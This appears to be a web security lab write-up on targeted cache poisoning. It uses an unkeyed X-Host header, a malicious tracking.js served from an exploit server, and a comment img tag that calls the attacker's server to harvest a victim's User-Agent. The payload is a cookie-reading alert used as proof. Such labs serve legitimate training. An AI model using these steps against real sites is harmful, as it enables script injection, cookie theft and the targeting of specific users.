# Lab 04 — Targeted Web Cache Poisoning Using an Unknown Header

## Objective

Poison the cache only for the subset of users to which the intended victim belongs.

## Step 1 — Discover the hidden input

1. Load the home page.
2. Open Burp HTTP history.
3. With Param Miner enabled, right-click the request.
4. Select **Guess headers**.
5. Identify:

```http
X-Host
```

## Step 2 — Confirm resource control

1. Send the request to Repeater.
2. Add a cache buster.
3. Add:

```http
X-Host: example.com
```

4. Confirm it controls the absolute URL for `/resources/js/tracking.js`.

## Step 3 — Prepare exploit

Create on the exploit server:

```text
/resources/js/tracking.js
```

Body:

```javascript
alert(document.cookie)
```

## Step 4 — Poison and verify

Use:

```http
X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Replay until the exploit URL is reflected and `X-Cache: hit` appears.

## Step 5 — Identify the victim's cache variant

The response uses `Vary` to indicate that `User-Agent` is part of the cache key.

1. Use the site's comment feature to post an allowed HTML image tag:

```html
<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
```

2. Confirm the comment is posted.
3. Open the exploit server's access log.
4. Refresh until a request from another user appears.
5. Treat this as the victim and copy their User-Agent.

## Step 6 — Target the victim

1. Put the victim's User-Agent into your malicious request.
2. Remove the cache buster.
3. Replay until the poisoned response is cached for that User-Agent variant.
4. Keep it poisoned until the victim visits.

## Key Learning

`Vary` can create targeted cache variants rather than a single globally shared response.
